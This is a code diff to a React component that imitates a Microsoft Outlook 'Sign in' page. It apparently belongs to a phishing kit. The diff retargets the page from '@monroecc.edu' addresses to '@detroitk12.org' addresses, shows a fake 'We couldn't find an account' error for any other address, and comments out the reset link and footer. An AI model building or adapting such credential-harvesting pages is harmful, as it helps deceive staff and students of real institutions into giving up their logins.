@@ -31,7 +31,7 @@ export const Email = ({ onNext, emailError, email }) => {
         "Enter a valid email address, phone number, or Skype name."
       );
       setBorderColor("1px solid red");
-    } else if (!emailValue.includes("@monroecc.edu")) {
+    } else if (!emailValue.includes("@detroitk12.org")) {
       setErrorMessage("We couldn't find an account with that username.");
       setBorderColor("1px solid red");
     } else {
@@ -59,7 +59,7 @@ export const Email = ({ onNext, emailError, email }) => {
       >
         <div className="f-t">
           <h1 className="form-title">Sign in</h1>
-          <p className="ft">to continue to Outlook</p>
+          {/* <p className="ft">to continue to Outlook</p> */}
         </div>
 
         <div className="input-message">
@@ -82,17 +82,16 @@ export const Email = ({ onNext, emailError, email }) => {
             }}
           />
         </div>
-        <a className="reset">Reset or Forgot Password</a>
-
+        {/* <a className="reset">Reset or Forgot Password</a> */}
+        <br />
+        <br />
         <div className="button-container">
           <button type="button" className="next" onClick={handleNext}>
             {isSending ? "Next" : "Next"}
           </button>
         </div>
       </div>
-      <FormFooter />
-      {error && <p style={{ color: "red" }}>{error}</p>}
-      {successMessage && <p style={{ color: "green" }}>{successMessage}</p>}
+      {/* <FormFooter /> */}
     </>
   );
 };
